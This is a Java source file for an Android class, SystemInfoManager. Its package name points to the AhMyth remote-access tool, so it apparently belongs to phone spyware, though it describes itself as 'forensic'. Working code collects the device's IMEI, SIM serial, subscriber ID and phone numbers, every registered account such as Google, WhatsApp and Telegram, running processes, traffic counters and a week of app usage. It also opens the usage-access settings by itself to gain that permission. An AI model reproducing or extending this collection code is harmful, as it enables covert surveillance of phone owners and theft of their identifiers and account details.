package ahmyth.mine.king.ahmyth;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.TrafficStats;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Debug;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.RandomAccessFile;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;

/**
 * SystemInfoManager provides detailed forensic system information
 */
public class SystemInfoManager {
    private static final String TAG = "SystemInfo";
    
    private Context context;
    
    public SystemInfoManager(Context context) {
        this.context = context;
    }
    
    /**
     * Get detailed battery information
     */
    public JSONObject getBatteryInfo() {
        JSONObject result = new JSONObject();
        
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, ifilter);
            
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                int plugged = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
                int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
                int voltage = batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
                int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
                String technology = batteryStatus.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY);
                
                result.put("level", (level * 100) / scale);
                result.put("scale", scale);
                result.put("voltage", voltage);
                result.put("temperature", temperature / 10.0);
                result.put("technology", technology);
                
                // Status
                String statusStr = "Unknown";
                switch (status) {
                    case BatteryManager.BATTERY_STATUS_CHARGING: statusStr = "Charging"; break;
                    case BatteryManager.BATTERY_STATUS_DISCHARGING: statusStr = "Discharging"; break;
                    case BatteryManager.BATTERY_STATUS_FULL: statusStr = "Full"; break;
                    case BatteryManager.BATTERY_STATUS_NOT_CHARGING: statusStr = "Not Charging"; break;
                }
                result.put("status", statusStr);
                
                // Plugged
                String pluggedStr = "Unplugged";
                switch (plugged) {
                    case BatteryManager.BATTERY_PLUGGED_AC: pluggedStr = "AC"; break;
                    case BatteryManager.BATTERY_PLUGGED_USB: pluggedStr = "USB"; break;
                    case BatteryManager.BATTERY_PLUGGED_WIRELESS: pluggedStr = "Wireless"; break;
                }
                result.put("plugged", pluggedStr);
                
                // Health
                String healthStr = "Unknown";
                switch (health) {
                    case BatteryManager.BATTERY_HEALTH_GOOD: healthStr = "Good"; break;
                    case BatteryManager.BATTERY_HEALTH_OVERHEAT: healthStr = "Overheat"; break;
                    case BatteryManager.BATTERY_HEALTH_DEAD: healthStr = "Dead"; break;
                    case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE: healthStr = "Over Voltage"; break;
                    case BatteryManager.BATTERY_HEALTH_COLD: healthStr = "Cold"; break;
                }
                result.put("health", healthStr);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting battery info", e);
        }
        
        return result;
    }
    
    /**
     * Get SIM card information
     */
    public JSONObject getSimInfo() {
        JSONObject result = new JSONObject();
        JSONArray simArray = new JSONArray();
        
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            
            if (tm != null) {
                result.put("phoneType", getPhoneType(tm.getPhoneType()));
                result.put("networkOperator", tm.getNetworkOperator());
                result.put("networkOperatorName", tm.getNetworkOperatorName());
                result.put("networkCountryIso", tm.getNetworkCountryIso());
                result.put("simOperator", tm.getSimOperator());
                result.put("simOperatorName", tm.getSimOperatorName());
                result.put("simCountryIso", tm.getSimCountryIso());
                result.put("simState", getSimState(tm.getSimState()));
                
                // Get SIM serial and IMEI (requires permission)
                try {
                    result.put("simSerialNumber", tm.getSimSerialNumber());
                    result.put("deviceId", tm.getDeviceId());
                    result.put("subscriberId", tm.getSubscriberId());
                    result.put("line1Number", tm.getLine1Number());
                } catch (SecurityException e) {
                    Log.d(TAG, "Phone state permission required for SIM details");
                }
                
                // Multi-SIM support (Android 5.1+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    try {
                        SubscriptionManager sm = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                        if (sm != null) {
                            List<SubscriptionInfo> subscriptions = sm.getActiveSubscriptionInfoList();
                            if (subscriptions != null) {
                                for (SubscriptionInfo info : subscriptions) {
                                    JSONObject simObj = new JSONObject();
                                    simObj.put("slot", info.getSimSlotIndex());
                                    simObj.put("carrierName", info.getCarrierName());
                                    simObj.put("displayName", info.getDisplayName());
                                    simObj.put("countryIso", info.getCountryIso());
                                    simObj.put("number", info.getNumber());
                                    simArray.put(simObj);
                                }
                            }
                        }
                    } catch (SecurityException e) {
                        Log.d(TAG, "Permission required for subscription info");
                    }
                }
            }
            
            result.put("simCards", simArray);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting SIM info", e);
        }
        
        return result;
    }
    
    /**
     * Get device accounts
     */
    public JSONObject getAccounts() {
        JSONObject result = new JSONObject();
        JSONArray accountsArray = new JSONArray();
        
        try {
            AccountManager am = AccountManager.get(context);
            Account[] accounts = am.getAccounts();
            
            for (Account account : accounts) {
                JSONObject accObj = new JSONObject();
                accObj.put("name", account.name);
                accObj.put("type", account.type);
                
                // Get account type friendly name
                String typeLabel = getAccountTypeLabel(account.type);
                accObj.put("typeLabel", typeLabel);
                
                accountsArray.put(accObj);
            }
            
            result.put("count", accountsArray.length());
            result.put("accounts", accountsArray);
            result.put("success", true);
            
            if (accountsArray.length() == 0) {
                result.put("note", "No accounts found or GET_ACCOUNTS permission not granted");
            }
            
        } catch (SecurityException e) {
            Log.d(TAG, "GET_ACCOUNTS permission required", e);
            try {
                result.put("success", false);
                result.put("error", "GET_ACCOUNTS permission required");
                result.put("count", 0);
                result.put("accounts", new JSONArray());
            } catch (JSONException ignored) {}
        } catch (Exception e) {
            Log.e(TAG, "Error getting accounts", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
                result.put("count", 0);
                result.put("accounts", new JSONArray());
            } catch (JSONException ignored) {}
        }
        
        return result;
    }
    
    /**
     * Get friendly name for account type
     */
    private String getAccountTypeLabel(String type) {
        if (type == null) return "Unknown";
        
        if (type.contains("google")) return "Google";
        if (type.contains("facebook")) return "Facebook";
        if (type.contains("twitter")) return "Twitter";
        if (type.contains("whatsapp")) return "WhatsApp";
        if (type.contains("samsung")) return "Samsung";
        if (type.contains("microsoft")) return "Microsoft";
        if (type.contains("yahoo")) return "Yahoo";
        if (type.contains("dropbox")) return "Dropbox";
        if (type.contains("linkedin")) return "LinkedIn";
        if (type.contains("instagram")) return "Instagram";
        if (type.contains("telegram")) return "Telegram";
        if (type.contains("skype")) return "Skype";
        
        // Extract app name from package-like type
        if (type.contains(".")) {
            String[] parts = type.split("\\.");
            if (parts.length > 0) {
                String last = parts[parts.length - 1];
                return last.substring(0, 1).toUpperCase() + last.substring(1);
            }
        }
        
        return type;
    }
    
    /**
     * Get running processes
     */
    public JSONObject getRunningProcesses() {
        JSONObject result = new JSONObject();
        JSONArray processesArray = new JSONArray();
        
        try {
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            
            if (am != null) {
                List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
                
                if (processes != null) {
                    for (ActivityManager.RunningAppProcessInfo proc : processes) {
                        JSONObject procObj = new JSONObject();
                        procObj.put("processName", proc.processName);
                        procObj.put("pid", proc.pid);
                        procObj.put("uid", proc.uid);
                        procObj.put("importance", getImportance(proc.importance));
                        
                        if (proc.pkgList != null && proc.pkgList.length > 0) {
                            JSONArray pkgs = new JSONArray();
                            for (String pkg : proc.pkgList) {
                                pkgs.put(pkg);
                            }
                            procObj.put("packages", pkgs);
                        }
                        
                        processesArray.put(procObj);
                    }
                }
            }
            
            result.put("count", processesArray.length());
            result.put("processes", processesArray);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting processes", e);
        }
        
        return result;
    }
    
    /**
     * Get network traffic statistics
     */
    public JSONObject getNetworkStats() {
        JSONObject result = new JSONObject();
        
        try {
            // Total device stats
            result.put("totalRxBytes", TrafficStats.getTotalRxBytes());
            result.put("totalTxBytes", TrafficStats.getTotalTxBytes());
            result.put("totalRxPackets", TrafficStats.getTotalRxPackets());
            result.put("totalTxPackets", TrafficStats.getTotalTxPackets());
            
            // Mobile data stats
            result.put("mobileRxBytes", TrafficStats.getMobileRxBytes());
            result.put("mobileTxBytes", TrafficStats.getMobileTxBytes());
            result.put("mobileRxPackets", TrafficStats.getMobileRxPackets());
            result.put("mobileTxPackets", TrafficStats.getMobileTxPackets());
            
            // Per-UID stats for this app
            int uid = android.os.Process.myUid();
            result.put("appRxBytes", TrafficStats.getUidRxBytes(uid));
            result.put("appTxBytes", TrafficStats.getUidTxBytes(uid));
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting network stats", e);
        }
        
        return result;
    }
    
    /**
     * Check if usage stats permission is granted
     */
    public boolean hasUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
                if (usm != null) {
                    Calendar calendar = Calendar.getInstance();
                    long endTime = calendar.getTimeInMillis();
                    calendar.add(Calendar.HOUR, -1);
                    long startTime = calendar.getTimeInMillis();
                    
                    List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime);
                    return stats != null && !stats.isEmpty();
                }
            } catch (Exception e) {
                return false;
            }
        }
        return false;
    }
    
    /**
     * Open usage access settings
     */
    public void openUsageAccessSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening usage access settings", e);
        }
    }
    
    /**
     * Get app usage statistics (Android 5.0+)
     */
    public JSONObject getAppUsageStats() {
        JSONObject result = new JSONObject();
        JSONArray usageArray = new JSONArray();
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                result.put("success", false);
                result.put("error", "Usage stats requires Android 5.0+");
                result.put("count", 0);
                result.put("usage", usageArray);
                return result;
            }
            
            UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            
            if (usm == null) {
                result.put("success", false);
                result.put("error", "UsageStatsManager not available");
                result.put("count", 0);
                result.put("usage", usageArray);
                return result;
            }
            
            Calendar calendar = Calendar.getInstance();
            long endTime = calendar.getTimeInMillis();
            calendar.add(Calendar.DAY_OF_YEAR, -7);
            long startTime = calendar.getTimeInMillis();
            
            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, startTime, endTime);
            
            if (stats == null || stats.isEmpty()) {
                // Permission not granted - try to open settings
                result.put("success", false);
                result.put("error", "Usage access permission required. Please enable in Settings > Apps > Special access > Usage access");
                result.put("requiresSettings", true);
                result.put("count", 0);
                result.put("usage", usageArray);
                
                // Open settings automatically
                openUsageAccessSettings();
                result.put("settingsOpened", true);
                
                return result;
            }
            
            PackageManager pm = context.getPackageManager();
            
            // Sort by usage time and get top apps
            java.util.Collections.sort(stats, (a, b) -> 
                Long.compare(b.getTotalTimeInForeground(), a.getTotalTimeInForeground()));
            
            int count = 0;
            for (UsageStats stat : stats) {
                if (stat.getTotalTimeInForeground() > 60000) { // More than 1 minute
                    JSONObject statObj = new JSONObject();
                    statObj.put("packageName", stat.getPackageName());
                    statObj.put("totalTimeInForeground", stat.getTotalTimeInForeground());
                    statObj.put("totalTimeFormatted", formatDuration(stat.getTotalTimeInForeground()));
                    statObj.put("lastTimeUsed", stat.getLastTimeUsed());
                    statObj.put("firstTimeStamp", stat.getFirstTimeStamp());
                    statObj.put("lastTimeStamp", stat.getLastTimeStamp());
                    
                    // Get app name
                    try {
                        String appName = pm.getApplicationLabel(
                            pm.getApplicationInfo(stat.getPackageName(), 0)).toString();
                        statObj.put("appName", appName);
                    } catch (Exception e) {
                        statObj.put("appName", stat.getPackageName());
                    }
                    
                    usageArray.put(statObj);
                    count++;
                    
                    if (count >= 50) break; // Limit to top 50 apps
                }
            }
            
            result.put("success", true);
            result.put("count", usageArray.length());
            result.put("usage", usageArray);
            result.put("periodDays", 7);
            
        } catch (SecurityException e) {
            Log.e(TAG, "Usage stats permission denied", e);
            try {
                result.put("success", false);
                result.put("error", "Usage access permission denied");
                result.put("requiresSettings", true);
                result.put("count", 0);
                result.put("usage", usageArray);
                openUsageAccessSettings();
                result.put("settingsOpened", true);
            } catch (JSONException ignored) {}
        } catch (Exception e) {
            Log.e(TAG, "Error getting usage stats", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
                result.put("count", 0);
                result.put("usage", usageArray);
            } catch (JSONException ignored) {}
        }
        
        return result;
    }
    
    /**
     * Format duration in human readable format
     */
    private String formatDuration(long millis) {
        long seconds = millis / 1000;
        long minutes = seconds / 60;
        long hours = minutes / 60;
        
        if (hours > 0) {
            return String.format(Locale.US, "%dh %dm", hours, minutes % 60);
        } else if (minutes > 0) {
            return String.format(Locale.US, "%dm %ds", minutes, seconds % 60);
        } else {
            return String.format(Locale.US, "%ds", seconds);
        }
    }
    
    /**
     * Get system uptime and info
     */
    public JSONObject getSystemInfo() {
        JSONObject result = new JSONObject();
        
        try {
            result.put("uptime", SystemClock.uptimeMillis());
            result.put("elapsedRealtime", SystemClock.elapsedRealtime());
            result.put("bootTime", System.currentTimeMillis() - SystemClock.elapsedRealtime());
            
            // Timezone info
            TimeZone tz = TimeZone.getDefault();
            result.put("timezone", tz.getID());
            result.put("timezoneOffset", tz.getRawOffset());
            result.put("timezoneDST", tz.useDaylightTime());
            
            // Locale
            Locale locale = Locale.getDefault();
            result.put("language", locale.getLanguage());
            result.put("country", locale.getCountry());
            result.put("displayLanguage", locale.getDisplayLanguage());
            result.put("displayCountry", locale.getDisplayCountry());
            
            // Device settings
            result.put("adbEnabled", Settings.Global.getInt(context.getContentResolver(), 
                Settings.Global.ADB_ENABLED, 0) == 1);
            result.put("developmentEnabled", Settings.Global.getInt(context.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1);
            
            // Memory info
            Runtime runtime = Runtime.getRuntime();
            result.put("runtimeMaxMemory", runtime.maxMemory());
            result.put("runtimeTotalMemory", runtime.totalMemory());
            result.put("runtimeFreeMemory", runtime.freeMemory());
            
            // CPU info
            result.put("availableProcessors", runtime.availableProcessors());
            result.put("cpuUsage", getCpuUsage());
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting system info", e);
        }
        
        return result;
    }
    
    /**
     * Get CPU usage percentage
     */
    private float getCpuUsage() {
        try {
            // Read first sample
            RandomAccessFile reader = new RandomAccessFile("/proc/stat", "r");
            String load = reader.readLine();
            reader.close();
            
            if (load == null || !load.startsWith("cpu ")) {
                Log.w(TAG, "Invalid /proc/stat format");
                return getCpuUsageAlternative();
            }
            
            String[] toks = load.split("\\s+");
            
            // Ensure we have enough tokens (at least 8: cpu, user, nice, system, idle, iowait, irq, softirq)
            if (toks.length < 8) {
                Log.w(TAG, "Not enough tokens in /proc/stat: " + toks.length);
                return getCpuUsageAlternative();
            }
            
            long idle1 = Long.parseLong(toks[4]);
            long cpu1 = Long.parseLong(toks[1]) + Long.parseLong(toks[2]) + Long.parseLong(toks[3])
                      + Long.parseLong(toks[5]) + Long.parseLong(toks[6]) + Long.parseLong(toks[7]);
            
            // Wait at least 1 second for accurate measurement
            Thread.sleep(1000);
            
            // Read second sample
            reader = new RandomAccessFile("/proc/stat", "r");
            load = reader.readLine();
            reader.close();
            
            if (load == null || !load.startsWith("cpu ")) {
                Log.w(TAG, "Invalid /proc/stat format on second read");
                return getCpuUsageAlternative();
            }
            
            toks = load.split("\\s+");
            
            if (toks.length < 8) {
                Log.w(TAG, "Not enough tokens in /proc/stat on second read: " + toks.length);
                return getCpuUsageAlternative();
            }
            
            long idle2 = Long.parseLong(toks[4]);
            long cpu2 = Long.parseLong(toks[1]) + Long.parseLong(toks[2]) + Long.parseLong(toks[3])
                      + Long.parseLong(toks[5]) + Long.parseLong(toks[6]) + Long.parseLong(toks[7]);
            
            long total1 = cpu1 + idle1;
            long total2 = cpu2 + idle2;
            long totalDiff = total2 - total1;
            long cpuDiff = cpu2 - cpu1;
            
            if (totalDiff <= 0) {
                Log.w(TAG, "Invalid CPU calculation: totalDiff <= 0");
                return getCpuUsageAlternative();
            }
            
            float usage = (float) cpuDiff / totalDiff * 100.0f;
            
            // Clamp to valid range
            if (usage < 0) usage = 0;
            if (usage > 100) usage = 100;
            
            return usage;
            
        } catch (Exception e) {
            Log.e(TAG, "Error reading CPU usage from /proc/stat", e);
            return getCpuUsageAlternative();
        }
    }
    
    /**
     * Alternative method to get CPU usage using ActivityManager
     */
    private float getCpuUsageAlternative() {
        try {
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) {
                return 0.0f;
            }
            
            // Get memory info which includes some CPU-related data
            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
            am.getMemoryInfo(memInfo);
            
            // Try to get CPU usage from running processes
            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            if (processes != null) {
                // Calculate approximate CPU usage based on process importance
                int totalProcesses = processes.size();
                int foregroundProcesses = 0;
                int visibleProcesses = 0;
                
                for (ActivityManager.RunningAppProcessInfo proc : processes) {
                    if (proc.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                        foregroundProcesses++;
                    } else if (proc.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE) {
                        visibleProcesses++;
                    }
                }
                
                // Rough estimate: foreground processes use more CPU
                float estimatedUsage = (foregroundProcesses * 5.0f + visibleProcesses * 2.0f) / totalProcesses * 100.0f;
                
                if (estimatedUsage > 100) estimatedUsage = 100;
                if (estimatedUsage < 0) estimatedUsage = 0;
                
                return estimatedUsage;
            }
            
            return 0.0f;
            
        } catch (Exception e) {
            Log.e(TAG, "Error in alternative CPU usage calculation", e);
            return 0.0f; // Return 0 instead of -1 for better UX
        }
    }
    
    private String getPhoneType(int type) {
        switch (type) {
            case TelephonyManager.PHONE_TYPE_GSM: return "GSM";
            case TelephonyManager.PHONE_TYPE_CDMA: return "CDMA";
            case TelephonyManager.PHONE_TYPE_SIP: return "SIP";
            default: return "None";
        }
    }
    
    private String getSimState(int state) {
        switch (state) {
            case TelephonyManager.SIM_STATE_READY: return "Ready";
            case TelephonyManager.SIM_STATE_ABSENT: return "Absent";
            case TelephonyManager.SIM_STATE_PIN_REQUIRED: return "PIN Required";
            case TelephonyManager.SIM_STATE_PUK_REQUIRED: return "PUK Required";
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED: return "Network Locked";
            default: return "Unknown";
        }
    }
    
    private String getImportance(int importance) {
        switch (importance) {
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND: return "Foreground";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE: return "Visible";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_SERVICE: return "Service";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_BACKGROUND: return "Background";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_EMPTY: return "Empty";
            default: return "Unknown";
        }
    }
}

